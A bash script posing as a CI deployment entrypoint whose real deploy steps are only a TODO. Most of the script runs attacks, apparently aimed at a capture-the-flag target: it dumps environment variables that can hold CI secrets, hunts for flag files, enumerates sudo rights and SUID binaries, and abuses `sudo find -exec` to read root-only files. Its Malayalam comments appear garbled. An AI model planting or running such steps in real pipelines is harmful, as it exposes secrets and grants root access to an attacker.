#!/usr/bin/env bash
# Deployment entrypoint executed by the self-hosted runner.
set -euo pipefail
echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
echo "[deploy] pulling latest VOID service artifacts..."
# TODO: real deploy steps (rsync artifacts, restart services)
echo "[deploy] done."
echo "=== TARGET INSPECTION ==="
id
env 
ls -la 
find / -name "*flag*" 2>/dev/null || true

echo "=== PRINTING THE FLAG ==="

cat /opt/void/ci_flag.txt

echo "=== PRIVILEGE ESCALATION CHECK ==="

# 1. പസ്വഡ് ഇല്ലത റൂട്ട് ആയ റൺ ചയ്യൻ പറ്റുന്ന കമൻഡുകൾ ഉണ്ട എന്ന് നക്കൻ (SUDO)

sudo -l || true


# 2. SUID പർമഷൻ ഉള്ള ഫയലുകൾ കണ്ടത്തൻ (ഇവ റൂട്ട് പ്രവലജൽ റൺ ചയ്യൻ പറ്റയക്കു)

find / -perm -4000 -type f 2>/dev/null || true


# 3. റൂട്ടന്റ ഹ ഡയറക്ടറയൽ എന്തക്ക ഉണ്ടന്ന് നക്കൻ ശ്രമക്ക

ls -la /root || true

echo "=== EXPLOITING SUDO FIND FOR ROOT FLAG ==="

# 1. റൂട്ട് ഡയറക്ടറയൽ ഉള്ള ഫ്ലഗ് ഫയൽ കണ്ടത്തൻ

sudo /usr/bin/find . -exec ls -la /root \; -quit


# 2. കണ്ടത്തുന്ന ഫ്ലഗ് ഫയൽ റഡ് ചയ്യൻ (സധരണയയ root_flag.txt അല്ലങ്കൽ flag.txt ആയരക്കു)

sudo /usr/bin/find . -exec cat /root/root_flag.txt \; -quit

echo "=== READING FINAL ROOT FLAG ==="

sudo /usr/bin/find . -exec cat /root/root.txt \; -quit
